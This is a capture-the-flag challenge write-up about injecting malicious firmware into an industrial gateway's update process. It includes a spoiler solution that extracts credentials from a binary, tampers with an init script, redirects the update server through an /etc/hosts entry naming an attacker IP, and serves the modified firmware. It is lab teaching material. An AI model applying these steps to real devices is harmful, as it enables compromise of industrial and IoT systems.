# 🔧 Malicious Firmware Update Injection

> **MITRE ATT&CK for ICS:** `Impair Process Control` | `Modify Firmware` | `Unauthorized Command Message`

---

## 📋 Overview
Modern industrial devices and IoT gateways often rely on remote firmware updates to fix bugs and deploy new features. However, insecure update mechanisms can become a critical attack vector.

In this challenge, you will:
- Compromise a gateway device
- Analyze internal network traffic
- Identify an update mechanism
- Manipulate firmware
- Inject a malicious update

Your goal is to **force the device to install a malicious firmware and trigger the flag**.

---

## 🎯 Objectives
- Reverse engineer a binary to gain access to the gateway
- Pivot into the internal network
- Identify the firmware update process
- Modify firmware and bypass update validation
- Successfully deploy a malicious firmware

---

## 🔄 Attack Flow
```
Attacker → Gateway → Internal Device → Update Server

   |         |             |                |
   | RE      |             |                |
   |-------->|             |                |
   |         | SSH Access  |                |
   |         |------------>|                |
   |         | Sniff Traffic               |
   |         |------------>|                |
   |         |             | Request FW     |
   |         |             |--------------->|
   |         | Manipulate Update Source     |
   |         |----------------------------->|
   |         |             | Install FW     |
   |         |             |--------------->|
   |         |             | Trigger Flag   |
```

---

## 🧠 Challenge Description

You are given access to a **gateway binary** extracted from a router.

Your task is to:
1. Analyze the binary to retrieve credentials
2. Access the gateway system
3. Monitor internal network traffic
4. Identify how firmware updates are retrieved
5. Replace the legitimate firmware with a malicious version
6. Trigger the flag through firmware execution

---

## 🧩 Phase 1: Gateway Compromise

### 🔍 Task
Analyze the provided binary:
```
gateway_service
```

### 🎯 Goal
Find credentials or hidden functionality to access the gateway.

### 💡 Hint
Look for:
- Hardcoded strings
- Credentials
- Suspicious functions

---

## 🌐 Phase 2: Network Analysis

Once you have access to the gateway:

### 🔍 Task
- Monitor internal traffic
- Identify periodic connections

### 🎯 Goal
Find the firmware update endpoint

### 💡 Hint
Use:
```bash
tcpdump
wireshark
netstat
```

Look for:
- HTTP requests
- Repeated connections
- Firmware downloads

---

## 🔄 Phase 3: Update Mechanism Analysis

### 🔍 Task
Understand how updates work.

### 🎯 Questions to answer
- Where is firmware downloaded from?
- How is version checked?
- Is integrity verified?

### 💡 Hint
Check:
- URLs
- Headers
- Version numbers

---

## 🧱 Phase 4: Firmware Analysis

You obtain a firmware file:
```
firmware.bin
```

### 🔍 Task
- Extract firmware
- Analyze structure
- Modify contents

### 💡 Hint
Use:
```bash
binwalk firmware.bin
```

Look for:
- filesystem
- scripts
- init files

---

## 💣 Phase 5: Malicious Firmware Injection

### 🔍 Task
Modify the firmware to execute your own logic.

### 🎯 Goal
Trigger the flag after installation.

### 💡 Possible approaches
- Modify init scripts
- Add new executable
- Change configuration

---

## 🌐 Phase 6: Update Hijacking

### 🔍 Task
Force the device to download your firmware.

### 🎯 Possible methods
- Modify DNS / hosts
- Redirect traffic
- Replace update server

---

## 🚀 Expected Outcome

If successful:
- The device installs your firmware
- Your payload executes
- The flag is generated

---

## 🏁 Flag Condition

The flag is triggered when:
- A modified firmware is successfully installed
- A specific condition inside the firmware is met

---

## 🚩 Flag
```
CybICS(malicious_firmware_injected)
```

---

## 🛡️ Security Insights

This challenge demonstrates real-world weaknesses:

### ❌ Common Issues
- No firmware signature validation
- Insecure update channels (HTTP)
- Trusting internal network blindly

### ✅ Secure Design Would Include
- Signed firmware (PKI)
- Secure boot
- TLS with certificate validation
- Update integrity verification

---

## 📚 MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|--------|----------|-------------|
| Impair Process Control | Modify Firmware | Malicious firmware injection |
| Initial Access | Valid Accounts | Credentials extracted from binary |
| Lateral Movement | Internal Pivoting | Access to internal network |
| Command and Control | Application Layer Protocol | HTTP-based update |

---

## 🔍 Solution (Spoiler)

<details>
  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>

### 🧠 Steps

1. Reverse engineer binary:
```bash
strings gateway_service
```

2. Extract credentials

3. SSH into gateway

4. Monitor traffic:
```bash
tcpdump -i eth1
```

5. Identify update URL:
```
http://updateserver/firmware.bin
```

6. Extract firmware:
```bash
binwalk -e firmware.bin
```

7. Modify init script:
```bash
echo "echo CybICS(malicious_firmware_injected) > /flag.txt" >> init.sh
```

8. Repack firmware

9. Redirect update server:
```bash
echo "attacker_ip updateserver" >> /etc/hosts
```

10. Serve malicious firmware:
```bash
python3 -m http.server 80
```

11. Wait for update → flag triggered

</details>
